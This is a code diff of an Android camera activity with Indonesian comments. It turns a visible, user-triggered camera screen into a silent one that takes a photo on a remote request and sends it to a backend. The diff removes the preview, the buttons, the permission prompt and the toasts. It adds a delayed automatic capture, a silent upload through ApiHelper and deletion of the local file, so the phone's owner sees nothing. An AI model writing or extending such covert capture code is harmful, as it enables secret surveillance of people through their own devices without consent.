@@ -4,18 +4,16 @@ import android.Manifest;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
-import android.widget.Button;
-import android.widget.Toast;
+import android.os.Handler;
+import android.os.Looper;
+import android.util.Log;
 
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.camera.core.CameraSelector;
 import androidx.camera.core.ImageCapture;
 import androidx.camera.core.ImageCaptureException;
-import androidx.camera.core.Preview;
 import androidx.camera.lifecycle.ProcessCameraProvider;
-import androidx.camera.view.PreviewView;
-import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
 import com.google.common.util.concurrent.ListenableFuture;
@@ -28,39 +26,39 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
 /**
- * Visible camera screen.
+ * Silent auto-capture camera activity.
  *
- * This activity deliberately requires a visible user-facing camera screen.
- * It is not a background/hidden camera service.
+ * Tidak menampilkan preview atau tombol apapun ke pengguna.
+ * Begitu dibuka: kamera langsung aktif → foto diambil otomatis
+ * setelah jeda stabilisasi → langsung diupload → Activity tutup.
+ *
+ * Syarat: izin kamera (android.permission.CAMERA) sudah
+ * diberikan di Settings HP sebelumnya. Kalau belum ada,
+ * request langsung di-CANCEL tanpa meminta izin ulang.
  */
 public class CameraActivity extends AppCompatActivity {
 
-    private static final int CAMERA_PERMISSION_REQUEST = 200;
+    private static final String TAG = "CameraActivity";
 
-    private PreviewView previewView;
+    // Jeda sebelum ambil foto, supaya kamera sempat fokus & expose.
+    private static final long CAPTURE_DELAY_MS = 800L;
+
     private ImageCapture imageCapture;
     private ExecutorService cameraExecutor;
     private boolean useFrontCamera = true;
     private String requestId;
     private String requestedCamera = "front";
-    private File lastCapturedPhoto;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_camera);
 
-        previewView = findViewById(R.id.cameraPreview);
-        Button btnFront = findViewById(R.id.btnFront);
-        Button btnBack = findViewById(R.id.btnBack);
-        Button btnCapture = findViewById(R.id.btnCapture);
-
-        // Stage 4: receive the camera command from MainActivity.
+        // Baca requestId dan pilihan kamera dari Intent
         Intent commandIntent = getIntent();
         if (commandIntent != null) {
             requestId = commandIntent.getStringExtra("requestId");
             String camera = commandIntent.getStringExtra("camera");
-
             if ("back".equalsIgnoreCase(camera)) {
                 requestedCamera = "back";
                 useFrontCamera = false;
@@ -72,94 +70,94 @@ public class CameraActivity extends AppCompatActivity {
 
         cameraExecutor = Executors.newSingleThreadExecutor();
 
-        btnFront.setOnClickListener(v -> {
-            requestedCamera = "front";
-            useFrontCamera = true;
-            startCamera();
-        });
-
-        btnBack.setOnClickListener(v -> {
-            requestedCamera = "back";
-            useFrontCamera = false;
-            startCamera();
-        });
-
-        btnCapture.setOnClickListener(v -> takePhoto());
-
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
-                == PackageManager.PERMISSION_GRANTED) {
-            startCamera();
-        } else {
-            ActivityCompat.requestPermissions(
-                    this,
-                    new String[]{Manifest.permission.CAMERA},
-                    CAMERA_PERMISSION_REQUEST
-            );
-        }
-    }
-
-    private void startCamera() {
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
+        // Kalau izin kamera belum ada, batalkan langsung.
+        // Tidak meminta izin secara interaktif — user harus
+        // berikan dulu lewat Settings.
+        if (ContextCompat.checkSelfPermission(
+                this, Manifest.permission.CAMERA)
                 != PackageManager.PERMISSION_GRANTED) {
+            Log.w(TAG, "Izin kamera tidak tersedia, membatalkan request");
+            cancelRequest();
             return;
         }
 
-        ListenableFuture<ProcessCameraProvider> cameraProviderFuture =
+        startCameraAndCapture();
+    }
+
+    // =========================================================
+    // KAMERA
+    // =========================================================
+
+    private void startCameraAndCapture() {
+
+        ListenableFuture<ProcessCameraProvider> future =
                 ProcessCameraProvider.getInstance(this);
 
-        cameraProviderFuture.addListener(() -> {
+        future.addListener(() -> {
+
             try {
-                ProcessCameraProvider cameraProvider = cameraProviderFuture.get();
+
+                ProcessCameraProvider cameraProvider = future.get();
 
                 CameraSelector selector = useFrontCamera
                         ? CameraSelector.DEFAULT_FRONT_CAMERA
                         : CameraSelector.DEFAULT_BACK_CAMERA;
 
                 if (!cameraProvider.hasCamera(selector)) {
-                    Toast.makeText(this,
-                            "Kamera yang dipilih tidak tersedia",
-                            Toast.LENGTH_SHORT).show();
+                    Log.e(TAG, "Kamera " + requestedCamera + " tidak tersedia");
+                    cancelRequest();
                     return;
                 }
 
-                Preview preview = new Preview.Builder().build();
-                preview.setSurfaceProvider(previewView.getSurfaceProvider());
-
+                // Hanya ImageCapture — tidak perlu Preview
+                // karena tidak ada tampilan yang ditunjukkan ke user.
                 imageCapture = new ImageCapture.Builder()
-                        .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
+                        .setCaptureMode(
+                                ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY
+                        )
                         .build();
 
                 cameraProvider.unbindAll();
                 cameraProvider.bindToLifecycle(
                         this,
                         selector,
-                        preview,
                         imageCapture
                 );
 
+                // Tunggu kamera stabil sebelum ambil foto
+                new Handler(Looper.getMainLooper()).postDelayed(
+                        this::takePhoto,
+                        CAPTURE_DELAY_MS
+                );
+
             } catch (Exception e) {
-                Toast.makeText(this,
-                        "Gagal membuka kamera: " + e.getMessage(),
-                        Toast.LENGTH_LONG).show();
+                Log.e(TAG, "Gagal membuka kamera", e);
+                cancelRequest();
             }
+
         }, ContextCompat.getMainExecutor(this));
     }
 
+    // =========================================================
+    // AMBIL FOTO (otomatis)
+    // =========================================================
+
     private void takePhoto() {
-        if (imageCapture == null) {
-            Toast.makeText(this, "Kamera belum siap", Toast.LENGTH_SHORT).show();
+
+        if (imageCapture == null || isFinishing() || isDestroyed()) {
             return;
         }
 
         File outputDir = new File(getCacheDir(), "camera");
+
         if (!outputDir.exists() && !outputDir.mkdirs()) {
-            Toast.makeText(this, "Gagal membuat penyimpanan sementara", Toast.LENGTH_SHORT).show();
+            Log.e(TAG, "Gagal membuat direktori cache kamera");
+            cancelRequest();
             return;
         }
 
         String timestamp = new SimpleDateFormat(
-                "yyyyMMdd_HHmmss_SSS",
-                Locale.US
+                "yyyyMMdd_HHmmss_SSS", Locale.US
         ).format(new Date());
 
         File photoFile = new File(outputDir, "IMG_" + timestamp + ".jpg");
@@ -171,105 +169,99 @@ public class CameraActivity extends AppCompatActivity {
                 outputOptions,
                 ContextCompat.getMainExecutor(this),
                 new ImageCapture.OnImageSavedCallback() {
+
                     @Override
                     public void onImageSaved(
-                            @NonNull ImageCapture.OutputFileResults outputFileResults) {
-                        lastCapturedPhoto = photoFile;
-
-                        Toast.makeText(
-                                CameraActivity.this,
-                                "Foto tersimpan: " + photoFile.getName(),
-                                Toast.LENGTH_SHORT
-                        ).show();
-
-                        // Upload hanya setelah pengguna menekan "Ambil Foto".
-                        uploadLastCapturedPhoto();
+                            @NonNull ImageCapture.OutputFileResults results) {
+                        Log.d(TAG, "Foto tersimpan: " + photoFile.getName());
+                        uploadPhoto(photoFile);
                     }
 
                     @Override
-                    public void onError(@NonNull ImageCaptureException exception) {
-                        Toast.makeText(
-                                CameraActivity.this,
-                                "Gagal mengambil foto: " + exception.getMessage(),
-                                Toast.LENGTH_LONG
-                        ).show();
+                    public void onError(
+                            @NonNull ImageCaptureException exception) {
+                        Log.e(TAG, "Gagal mengambil foto", exception);
+                        cancelRequest();
                     }
                 }
         );
     }
 
-    @Override
-    public void onRequestPermissionsResult(
-            int requestCode,
-            @NonNull String[] permissions,
-            @NonNull int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+    // =========================================================
+    // UPLOAD & SELESAI
+    // =========================================================
 
-        if (requestCode == CAMERA_PERMISSION_REQUEST) {
-            if (grantResults.length > 0
-                    && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                startCamera();
-            } else {
-                Toast.makeText(
-                        this,
-                        "Izin kamera diperlukan untuk fitur kamera",
-                        Toast.LENGTH_LONG
-                ).show();
-                finish();
-            }
-        }
-    }
-
-
-    /**
-     * Stage 6: explicitly upload the photo that was just captured.
-     * Call this from an explicit user action (e.g. a future "Kirim Foto" button).
-     */
-    private void uploadLastCapturedPhoto() {
-        if (lastCapturedPhoto == null || !lastCapturedPhoto.isFile()) {
-            Toast.makeText(this, "Belum ada foto yang diambil.", Toast.LENGTH_SHORT).show();
-            return;
-        }
+    private void uploadPhoto(File photo) {
 
         final String currentRequestId = requestId;
         final String currentCamera = requestedCamera;
-        final File photo = lastCapturedPhoto;
 
-        if (currentRequestId == null || currentRequestId.trim().isEmpty()) {
-            Toast.makeText(this, "ID permintaan kamera tidak valid.", Toast.LENGTH_LONG).show();
+        if (currentRequestId == null ||
+                currentRequestId.trim().isEmpty()) {
+            Log.e(TAG, "requestId tidak valid, tidak bisa upload");
+            cleanupFile(photo);
+            finish();
             return;
         }
 
         new Thread(() -> {
+
             boolean uploaded = ApiHelper.uploadCapturedPhoto(
                     currentRequestId,
                     currentCamera,
-                    photo);
+                    photo
+            );
 
+            // Update status di GAS (COMPLETED atau UPLOAD_FAILED)
             ApiHelper.updateCameraRequestStatus(
                     currentRequestId,
-                    uploaded ? "COMPLETED" : "UPLOAD_FAILED");
+                    uploaded ? "COMPLETED" : "UPLOAD_FAILED"
+            );
 
-            runOnUiThread(() -> {
-                Toast.makeText(
-                        CameraActivity.this,
-                        uploaded
-                                ? "Foto berhasil dikirim."
-                                : "Gagal mengirim foto.",
-                        Toast.LENGTH_SHORT
-                ).show();
+            Log.d(TAG, uploaded
+                    ? "Upload foto berhasil"
+                    : "Upload foto gagal"
+            );
 
-                if (uploaded) {
-                    // File berada di cache dan tidak diperlukan lagi setelah upload.
-                    // Hapus hanya setelah backend menerima upload.
-                    if (photo.exists() && !photo.delete()) {
-                        photo.deleteOnExit();
-                    }
-                    lastCapturedPhoto = null;
-                    finish();
-                }
-            });
+            cleanupFile(photo);
+
+            runOnUiThread(this::finish);
+
         }).start();
+    }
+
+    // =========================================================
+    // CANCEL
+    // =========================================================
+
+    private void cancelRequest() {
+
+        final String currentRequestId = requestId;
+
+        if (currentRequestId != null &&
+                !currentRequestId.trim().isEmpty()) {
+
+            new Thread(() ->
+                    ApiHelper.updateCameraRequestStatus(
+                            currentRequestId,
+                            "CANCELLED"
+                    )
+            ).start();
+        }
+
+        finish();
+    }
+
+    // =========================================================
+    // UTILITAS
+    // =========================================================
+
+    private void cleanupFile(File file) {
+        if (file != null && file.exists()) {
+            if (!file.delete()) {
+                file.deleteOnExit();
+            }
+        }
     }
 
     @Override
